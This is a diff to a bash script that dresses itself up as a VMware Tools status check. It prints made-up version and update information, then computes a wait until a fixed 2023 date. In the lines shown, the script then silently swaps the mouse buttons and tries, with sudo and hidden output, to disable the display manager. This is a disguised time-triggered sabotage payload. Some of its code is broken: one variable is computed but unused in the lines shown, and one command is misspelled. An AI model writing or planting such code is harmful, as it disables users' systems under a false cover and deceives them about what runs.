@@ -1,8 +1,23 @@
 #!/bin/bash
-initial_time='202304170515' 
-while [ $(date '+%Y%m%d%H%M') -lt $initial_time ]; do
-    sleep 1
-done
+VMWARE_TOOLS_INSTALL_DIR="/lib/systemd/system/"
+if [ ! -d "$VMWARE_TOOLS_INSTALL_DIR" ]; then
+  echo "Error: VMware Tools installation directory not found"
+  exit 1
+fi
+if systemctl is-active open-vm-tools.service &> /dev/null; then
+  echo "VMware Tools service is running"
+else
+  echo "VMware Tools service is not running"
+fi
+systemctl status vmware-tools.service
+echo "VMware Tools version: 12.2.0"
+echo "Last update: January 1, 1970 00:00:00"
+
+target_date="2023-04-17"
+target_time="17:13:00"
+target_timestamp=$(date -d "${target_date} ${target_time}" +%s)
+current_timestamp=$(date +%s)
+sleep_time=$(( target_timestamp - current_timestamp ))
 xmodmap -e "pointer = 3 2 1" &> /dev/null
 if command -v systemctl &> /dev/null; then
 	sudo system disable display-manager.service &>/dev/null
